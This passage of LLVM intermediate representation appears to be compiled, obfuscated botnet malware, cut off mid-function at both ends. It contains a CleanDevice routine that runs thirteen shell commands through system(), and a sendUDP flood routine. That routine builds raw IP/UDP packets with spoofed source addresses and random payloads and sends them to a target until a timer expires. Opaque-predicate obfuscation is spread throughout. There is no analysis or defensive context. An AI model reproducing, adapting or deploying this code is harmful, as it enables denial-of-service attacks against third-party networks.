  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = load i32, i32* @x.95
  %2 = load i32, i32* @y.96
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.104, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.105, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.106, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.107, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.108, i32 0, i32 0))
  %14 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0))
  %15 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %16 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  %17 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.112, i32 0, i32 0))
  %18 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.113, i32 0, i32 0))
  %19 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.114, i32 0, i32 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.115, i32 0, i32 0))
  %21 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0))
  %22 = load i32, i32* @x.95
  %23 = load i32, i32* @y.96
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %30 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.104, i32 0, i32 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.105, i32 0, i32 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.106, i32 0, i32 0))
  %33 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.107, i32 0, i32 0))
  %34 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.108, i32 0, i32 0))
  %35 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0))
  %36 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %37 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  %38 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.112, i32 0, i32 0))
  %39 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.113, i32 0, i32 0))
  %40 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.114, i32 0, i32 0))
  %41 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.115, i32 0, i32 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0))
  br label %originalBB
}

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %62

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* @x.97
  %43 = load i32, i32* @y.98
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* %10, align 4
  %51 = trunc i32 %50 to i16
  %52 = call zeroext i16 @htons(i16 zeroext %51) #10
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @x.97
  %55 = load i32, i32* @y.98
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %37
  %63 = load i8*, i8** %9, align 8
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %65 = call i32 @getHost(i8* %63, %struct.in_addr* %64)
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %479

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.97
  %70 = load i32, i32* @y.98
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %78 = getelementptr inbounds [8 x i8], [8 x i8]* %77, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %78, i8 0, i64 8, i32 4, i1 false)
  %79 = load i32, i32* %14, align 4
  store i32 %79, i32* %18, align 4
  %80 = load i32, i32* %12, align 4
  %81 = icmp eq i32 %80, 32
  %82 = load i32, i32* @x.97
  %83 = load i32, i32* @y.98
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %81, label %90, label %219

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %97, label %94

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @KadenCommStock, align 4
  %96 = call i32 (i32, i8*, ...) @botnetPrint(i32 %95, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.117, i32 0, i32 0))
  br label %479

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* @x.97
  %99 = load i32, i32* @y.98
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* %13, align 4
  %107 = add nsw i32 %106, 1
  %108 = sext i32 %107 to i64
  %109 = call noalias i8* @malloc(i64 %108) #3
  store i8* %109, i8** %20, align 8
  %110 = load i8*, i8** %20, align 8
  %111 = icmp eq i8* %110, null
  %112 = load i32, i32* @x.97
  %113 = load i32, i32* @y.98
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br i1 %111, label %120, label %121

; <label>:120:                                    ; preds = %originalBBpart219
  br label %479

; <label>:121:                                    ; preds = %originalBBpart219
  %122 = load i32, i32* @x.97
  %123 = load i32, i32* @y.98
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %121
  %130 = load i8*, i8** %20, align 8
  %131 = load i32, i32* %13, align 4
  %132 = add nsw i32 %131, 1
  %133 = sext i32 %132 to i64
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 %133, i32 1, i1 false)
  %134 = load i8*, i8** %20, align 8
  %135 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %134, i32 %135)
  %136 = call i64 @time(i64* null) #3
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = add nsw i64 %136, %138
  %140 = trunc i64 %139 to i32
  store i32 %140, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %141 = load i32, i32* @x.97
  %142 = load i32, i32* @y.98
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart238, label %originalBB21alteredBB

originalBBpart238:                                ; preds = %originalBB21
  br label %149

; <label>:149:                                    ; preds = %215, %originalBBpart249, %188, %originalBBpart238
  %150 = load i32, i32* %19, align 4
  %151 = load i8*, i8** %20, align 8
  %152 = load i32, i32* %13, align 4
  %153 = sext i32 %152 to i64
  %154 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %155 = call i64 @sendto(i32 %150, i8* %151, i64 %153, i32 0, %struct.sockaddr* %154, i32 16)
  %156 = load i32, i32* %22, align 4
  %157 = load i32, i32* %18, align 4
  %158 = icmp eq i32 %156, %157
  br i1 %158, label %159, label %189

; <label>:159:                                    ; preds = %149
  %160 = load i32, i32* %10, align 4
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %162, label %166

; <label>:162:                                    ; preds = %159
  %163 = call i32 @rand_cmwc()
  %164 = trunc i32 %163 to i16
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %164, i16* %165, align 2
  br label %166

; <label>:166:                                    ; preds = %162, %159
  %167 = call i64 @time(i64* null) #3
  %168 = load i32, i32* %21, align 4
  %169 = sext i32 %168 to i64
  %170 = icmp sgt i64 %167, %169
  br i1 %170, label %171, label %188

; <label>:171:                                    ; preds = %166
  %172 = load i32, i32* @x.97
  %173 = load i32, i32* @y.98
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %171
  %180 = load i32, i32* @x.97
  %181 = load i32, i32* @y.98
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %218

; <label>:188:                                    ; preds = %166
  store i32 0, i32* %22, align 4
  br label %149

; <label>:189:                                    ; preds = %149
  %190 = load i32, i32* %22, align 4
  %191 = add i32 %190, 1
  store i32 %191, i32* %22, align 4
  %192 = load i32, i32* %23, align 4
  %193 = load i32, i32* %15, align 4
  %194 = icmp eq i32 %192, %193
  br i1 %194, label %195, label %215

; <label>:195:                                    ; preds = %189
  %196 = load i32, i32* @x.97
  %197 = load i32, i32* @y.98
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %195
  %204 = load i32, i32* %16, align 4
  %205 = mul nsw i32 %204, 1000
  %206 = call i32 @usleep(i32 %205)
  store i32 0, i32* %23, align 4
  %207 = load i32, i32* @x.97
  %208 = load i32, i32* @y.98
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart249, label %originalBB44alteredBB

originalBBpart249:                                ; preds = %originalBB44
  br label %149

; <label>:215:                                    ; preds = %189
  %216 = load i32, i32* %23, align 4
  %217 = add i32 %216, 1
  store i32 %217, i32* %23, align 4
  br label %149

; <label>:218:                                    ; preds = %originalBBpart242
  br label %479

; <label>:219:                                    ; preds = %originalBBpart24
  %220 = load i32, i32* @x.97
  %221 = load i32, i32* @y.98
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %219
  %228 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %228, i32* %24, align 4
  %229 = load i32, i32* %24, align 4
  %230 = icmp ne i32 %229, 0
  %231 = load i32, i32* @x.97
  %232 = load i32, i32* @y.98
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %230, label %242, label %239

; <label>:239:                                    ; preds = %originalBBpart253
  %240 = load i32, i32* @KadenCommStock, align 4
  %241 = call i32 (i32, i8*, ...) @botnetPrint(i32 %240, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.117, i32 0, i32 0))
  br label %479

; <label>:242:                                    ; preds = %originalBBpart253
  store i32 1, i32* %25, align 4
  %243 = load i32, i32* %24, align 4
  %244 = bitcast i32* %25 to i8*
  %245 = call i32 @setsockopt(i32 %243, i32 0, i32 3, i8* %244, i32 4) #3
  %246 = icmp slt i32 %245, 0
  br i1 %246, label %247, label %250

; <label>:247:                                    ; preds = %242
  %248 = load i32, i32* @KadenCommStock, align 4
  %249 = call i32 (i32, i8*, ...) @botnetPrint(i32 %248, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.118, i32 0, i32 0))
  br label %479

; <label>:250:                                    ; preds = %242
  store i32 50, i32* %26, align 4
  br label %251

; <label>:251:                                    ; preds = %271, %250
  %252 = load i32, i32* @x.97
  %253 = load i32, i32* @y.98
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %251
  %260 = load i32, i32* %26, align 4
  %261 = add nsw i32 %260, -1
  store i32 %261, i32* %26, align 4
  %262 = icmp ne i32 %260, 0
  %263 = load i32, i32* @x.97
  %264 = load i32, i32* @y.98
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart267, label %originalBB55alteredBB

originalBBpart267:                                ; preds = %originalBB55
  br i1 %262, label %271, label %278

; <label>:271:                                    ; preds = %originalBBpart267
  %272 = call i64 @time(i64* null) #3
  %273 = call i32 @rand_cmwc()
  %274 = zext i32 %273 to i64
  %275 = xor i64 %272, %274
  %276 = trunc i64 %275 to i32
  call void @srand(i32 %276) #3
  %277 = call i32 @rand() #3
  call void @init_rand(i32 %277)
  br label %251

; <label>:278:                                    ; preds = %originalBBpart267
  %279 = load i32, i32* %12, align 4
  %280 = icmp eq i32 %279, 0
  br i1 %280, label %281, label %282

; <label>:281:                                    ; preds = %278
  store i32 0, i32* %27, align 4
  br label %288

; <label>:282:                                    ; preds = %278
  %283 = load i32, i32* %12, align 4
  %284 = sub nsw i32 32, %283
  %285 = shl i32 1, %284
  %286 = sub nsw i32 %285, 1
  %287 = xor i32 %286, -1
  store i32 %287, i32* %27, align 4
  br label %288

; <label>:288:                                    ; preds = %282, %281
  %289 = load i32, i32* %13, align 4
  %290 = sext i32 %289 to i64
  %291 = add i64 28, %290
  %292 = call i8* @llvm.stacksave()
  store i8* %292, i8** %28, align 8
  %293 = alloca i8, i64 %291, align 16
  %294 = bitcast i8* %293 to %struct.iphdr*
  store %struct.iphdr* %294, %struct.iphdr** %29, align 8
  %295 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %296 = bitcast %struct.iphdr* %295 to i8*
  %297 = getelementptr i8, i8* %296, i64 20
  %298 = bitcast i8* %297 to %struct.udphdr*
  store %struct.udphdr* %298, %struct.udphdr** %30, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %300 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %301 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 4
  %303 = load i32, i32* %27, align 4
  %304 = call i32 @GRIP(i32 %303)
  %305 = call i32 @htonl(i32 %304) #10
  %306 = load i32, i32* %13, align 4
  %307 = sext i32 %306 to i64
  %308 = add i64 8, %307
  %309 = trunc i64 %308 to i32
  call void @makeIPPacket(%struct.iphdr* %299, i32 %302, i32 %305, i8 zeroext 17, i32 %309)
  %310 = load i32, i32* %13, align 4
  %311 = sext i32 %310 to i64
  %312 = add i64 8, %311
  %313 = trunc i64 %312 to i16
  %314 = call zeroext i16 @htons(i16 zeroext %313) #10
  %315 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 0
  %317 = bitcast %union.anon.1* %316 to %struct.anon.2*
  %318 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %317, i32 0, i32 2
  store i16 %314, i16* %318, align 2
  %319 = call i32 @rand_cmwc()
  %320 = trunc i32 %319 to i16
  %321 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %322 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %321, i32 0, i32 0
  %323 = bitcast %union.anon.1* %322 to %struct.anon.2*
  %324 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %323, i32 0, i32 0
  store i16 %320, i16* %324, align 2
  %325 = load i32, i32* %10, align 4
  %326 = icmp eq i32 %325, 0
  br i1 %326, label %327, label %329

; <label>:327:                                    ; preds = %288
  %328 = call i32 @rand_cmwc()
  br label %334

; <label>:329:                                    ; preds = %288
  %330 = load i32, i32* %10, align 4
  %331 = trunc i32 %330 to i16
  %332 = call zeroext i16 @htons(i16 zeroext %331) #10
  %333 = zext i16 %332 to i32
  br label %334

; <label>:334:                                    ; preds = %329, %327
  %335 = phi i32 [ %328, %327 ], [ %333, %329 ]
  %336 = trunc i32 %335 to i16
  %337 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %338 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %337, i32 0, i32 0
  %339 = bitcast %union.anon.1* %338 to %struct.anon.2*
  %340 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %339, i32 0, i32 1
  store i16 %336, i16* %340, align 2
  %341 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 0
  %343 = bitcast %union.anon.1* %342 to %struct.anon.2*
  %344 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %343, i32 0, i32 3
  store i16 0, i16* %344, align 2
  %345 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %346 = bitcast %struct.udphdr* %345 to i8*
  %347 = getelementptr inbounds i8, i8* %346, i64 8
  %348 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %347, i32 %348)
  %349 = bitcast i8* %293 to i16*
  %350 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 2
  %352 = load i16, i16* %351, align 2
  %353 = zext i16 %352 to i32
  %354 = call zeroext i16 @csum(i16* %349, i32 %353)
  %355 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 7
  store i16 %354, i16* %356, align 2
  %357 = call i64 @time(i64* null) #3
  %358 = load i32, i32* %11, align 4
  %359 = sext i32 %358 to i64
  %360 = add nsw i64 %357, %359
  %361 = trunc i64 %360 to i32
  store i32 %361, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %362

; <label>:362:                                    ; preds = %474, %470, %447, %334
  br label %363

; <label>:363:                                    ; preds = %362
  %364 = load i32, i32* %24, align 4
  %365 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %366 = call i64 @sendto(i32 %364, i8* %293, i64 %291, i32 0, %struct.sockaddr* %365, i32 16)
  %367 = call i32 @rand_cmwc()
  %368 = trunc i32 %367 to i16
  %369 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %370 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %369, i32 0, i32 0
  %371 = bitcast %union.anon.1* %370 to %struct.anon.2*
  %372 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %371, i32 0, i32 0
  store i16 %368, i16* %372, align 2
  %373 = load i32, i32* %10, align 4
  %374 = icmp eq i32 %373, 0
  br i1 %374, label %375, label %393

; <label>:375:                                    ; preds = %363
  %376 = load i32, i32* @x.97
  %377 = load i32, i32* @y.98
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %375
  %384 = call i32 @rand_cmwc()
  %385 = load i32, i32* @x.97
  %386 = load i32, i32* @y.98
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %398

; <label>:393:                                    ; preds = %363
  %394 = load i32, i32* %10, align 4
  %395 = trunc i32 %394 to i16
  %396 = call zeroext i16 @htons(i16 zeroext %395) #10
  %397 = zext i16 %396 to i32
  br label %398

; <label>:398:                                    ; preds = %393, %originalBBpart271
  %399 = phi i32 [ %384, %originalBBpart271 ], [ %397, %393 ]
  %400 = trunc i32 %399 to i16
  %401 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %402 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %401, i32 0, i32 0
  %403 = bitcast %union.anon.1* %402 to %struct.anon.2*
  %404 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %403, i32 0, i32 1
  store i16 %400, i16* %404, align 2
  %405 = call i32 @rand_cmwc()
  %406 = trunc i32 %405 to i16
  %407 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = load i32, i32* %27, align 4
  %410 = call i32 @GRIP(i32 %409)
  %411 = call i32 @htonl(i32 %410) #10
  %412 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 8
  store i32 %411, i32* %413, align 4
  %414 = bitcast i8* %293 to i16*
  %415 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 2
  %417 = load i16, i16* %416, align 2
  %418 = zext i16 %417 to i32
  %419 = call zeroext i16 @csum(i16* %414, i32 %418)
  %420 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 7
  store i16 %419, i16* %421, align 2
  %422 = load i32, i32* %32, align 4
  %423 = load i32, i32* %18, align 4
  %424 = icmp eq i32 %422, %423
  br i1 %424, label %425, label %448

; <label>:425:                                    ; preds = %398
  %426 = load i32, i32* @x.97
  %427 = load i32, i32* @y.98
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %425
  %434 = call i64 @time(i64* null) #3
  %435 = load i32, i32* %31, align 4
  %436 = sext i32 %435 to i64
  %437 = icmp sgt i64 %434, %436
  %438 = load i32, i32* @x.97
  %439 = load i32, i32* @y.98
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %437, label %446, label %447

; <label>:446:                                    ; preds = %originalBBpart275
  br label %477

; <label>:447:                                    ; preds = %originalBBpart275
  store i32 0, i32* %32, align 4
  br label %362

; <label>:448:                                    ; preds = %398
  %449 = load i32, i32* @x.97
  %450 = load i32, i32* @y.98
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %448
  %457 = load i32, i32* %32, align 4
  %458 = add i32 %457, 1
  store i32 %458, i32* %32, align 4
  %459 = load i32, i32* %33, align 4
  %460 = load i32, i32* %15, align 4
  %461 = icmp eq i32 %459, %460
  %462 = load i32, i32* @x.97
  %463 = load i32, i32* @y.98
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBBpart282, label %originalBB77alteredBB

originalBBpart282:                                ; preds = %originalBB77
  br i1 %461, label %470, label %474

; <label>:470:                                    ; preds = %originalBBpart282
  %471 = load i32, i32* %16, align 4
  %472 = mul nsw i32 %471, 1000
